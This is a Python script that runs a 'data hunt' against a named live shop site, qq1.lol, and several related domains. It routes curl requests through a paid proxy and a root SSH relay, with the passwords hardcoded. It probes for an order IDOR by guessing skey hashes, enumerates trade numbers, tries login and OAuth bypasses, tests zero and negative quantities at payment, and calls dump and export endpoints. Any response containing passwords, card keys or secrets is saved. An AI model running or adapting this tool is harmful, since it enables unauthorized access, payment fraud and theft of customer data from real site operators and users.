#!/usr/bin/env python3
"""qq1.lol high-value data extraction attempts"""
import json, re, shlex, subprocess, time, hashlib
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path("/workspace/results/qq1.lol")
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "data_hunt.log"
QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JP_PASS, JP_HOST = "DX4LmrDaPfd9", "42.240.167.114"
JAR = str(OUT / ".hunt_cookies")
_proxy = None

def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG,"a").write(line+"\n")

def get_proxy():
    global _proxy
    if _proxy: return _proxy
    try:
        r = subprocess.run(["curl","-s",f"https://share.proxy.qg.net/get?key={QG_KEY}&num=1"],capture_output=True,text=True,timeout=15)
        d = json.loads(r.stdout)
        if d.get("code")=="SUCCESS":
            _proxy = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
    except: pass
    return _proxy

def qg(url, method="GET", post=None, timeout=20):
    parts = ["curl","-sk",f"--max-time={timeout}","-b",JAR,"-c",JAR,
             "-A","Mozilla/5.0","-H",f"Referer: {BASE}/"]
    p = get_proxy()
    if p: parts[2:2]=["-x",p]
    if method=="POST":
        parts += ["-X","POST","-H","Content-Type: application/x-www-form-urlencoded"]
        if post: parts += ["-d",post]
    parts.append(url)
    cmd = ["sshpass","-p",JP_PASS,"ssh","-o","StrictHostKeyChecking=no",f"root@{JP_HOST}",
           " ".join(shlex.quote(x) for x in parts)]
    try:
        return subprocess.run(cmd,capture_output=True,text=True,timeout=timeout+15).stdout.strip()
    except: return ""

def hit(name, body):
    if not body: return
    markers = ["kminfo","卡密","password","账号","----","@qq.com","code\":0","saveOK\":0",
               "trade_no","skey","orderItem","kami","card_no","secret"]
    for m in markers:
        if m in body and "code\":-1" not in body[:50]:
            log(f"*** HIT [{name}] marker={m}: {body[:300]}")
            open(OUT/f"hit_{name}.txt","w").write(body)
            return True
    return False

def test_getshop():
    log("=== getshop.php trade_no enum ===")
    paths = ["getshop.php","shop/getshop.php","other/getshop.php","user/getshop.php",
             "ajax.php?act=getshop","ajax.php?act=getcard","ajax.php?act=cardlist",
             "ajax.php?act=faka","ajax.php?act=sendcard","ajax.php?act=kami"]
    for p in paths:
        body = qg(f"{BASE}/{p}")
        hit(f"path_{p}", body)
    # trade_no patterns
    now = datetime.now()
    for h in range(48):
        t = now - timedelta(hours=h)
        for suffix in ["001","146","000","100"]:
            tn = t.strftime("%Y%m%d%H%M%S") + suffix
            for ep in [f"getshop.php?trade_no={tn}", f"getshop.php?id={tn}",
                       f"?mod=order&orderid={tn}", f"other/getshop.php?trade_no={tn}"]:
                body = qg(f"{BASE}/{ep}")
                if hit(f"trade_{tn}", body): return
            if h % 6 == 0 and suffix=="001":
                log(f"  scanned ~{h}h trade_no...")

def test_order_idor():
    log("=== order IDOR extended ===")
    qg(f"{BASE}/")
    for oid in range(25900, 25920):
        for skey in ["", "1", str(oid), hashlib.md5(str(oid).encode()).hexdigest(),
                     hashlib.md5(f"{oid}qq1".encode()).hexdigest()]:
            body = qg(f"{BASE}/ajax.php?act=order","POST",f"id={oid}&skey={skey}")
            if hit(f"order_{oid}", body): return
    # query by numeric id
    for oid in [25915, 25914, 25913, 1, 100]:
        body = qg(f"{BASE}/?mod=query&data={oid}")
        hit(f"query_{oid}", body)

def test_quickreg_oauth():
    log("=== quickreg / oauth bypass ===")
    for act in ["quickreg","connect","oauth","qqlogin","wxlogin"]:
        body = qg(f"{BASE}/user/ajax.php?act={act}","POST","type=qq&submit=do")
        hit(f"user_{act}", body)
        body = qg(f"{BASE}/ajax.php?act={act}","POST","type=qq")
        hit(f"ajax_{act}", body)
    body = qg(f"{BASE}/user/qrlogin.php?do=getqrpic")
    hit("qrlogin_getqrpic", body)

def test_free_pay():
    log("=== free pay / gift / coupon ===")
    page = qg(f"{BASE}/?mod=buy&cid=14&tid=131")
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', page)
    csrf = csrf.group(1) if csrf else ""
    for num in ["0","-1","0.001"]:
        body = qg(f"{BASE}/ajax.php?act=pay","POST",
                  f"csrf_token={csrf}&tid=131&num={num}&inputvalue=13800138000")
        hit(f"pay_num_{num}", body)
    for act in ["gift_start","coupon","cutshop","groupshop","seckill"]:
        body = qg(f"{BASE}/ajax.php?act={act}","POST","tid=131")
        hit(act, body)

def test_api_dump():
    log("=== api dump actions ===")
    acts = ["export","download","backup","orderlist","getorder","cardlist","getcard",
            "getkami","kami","faka","send","toollogs","getlogs","getmoney","siteinfo",
            "getconfig","getsite","getuser","userlist","memberlist","dump","rev_api_orders_dump"]
    for act in acts:
        for ep in ["ajax.php","api.php","user/ajax.php","sup/ajax.php"]:
            body = qg(f"{BASE}/{ep}?act={act}","POST","page=1&limit=100")
            if '"code":0' in body or hit(f"{ep}_{act}", body):
                log(f"  {ep}/{act}: {body[:150]}")

def test_related_sites():
    log("=== related sites same stack ===")
    for site in ["htqq.lol","hmjf.lol","fffzz.lol","qw123.lol","q8.qq0.lol"]:
        for path in ["","shop/","ajax.php?act=getcount"]:
            url = f"https://{site}/{path}" if path else f"https://{site}/"
            body = qg(url, "POST" if "ajax" in path else "GET")
            if body and len(body)>50 and "404" not in body[:100]:
                log(f"  {site}/{path}: {body[:100]}")
                if "getcount" in path and '"code":0' in body:
                    hit(f"{site}_getcount", body)

def main():
    log("=== DATA HUNT START ===")
    get_proxy()
    qg(f"{BASE}/")
    test_api_dump()
    test_getshop()
    test_order_idor()
    test_quickreg_oauth()
    test_free_pay()
    test_related_sites()
    log("=== DATA HUNT DONE ===")

if __name__ == "__main__":
    main()
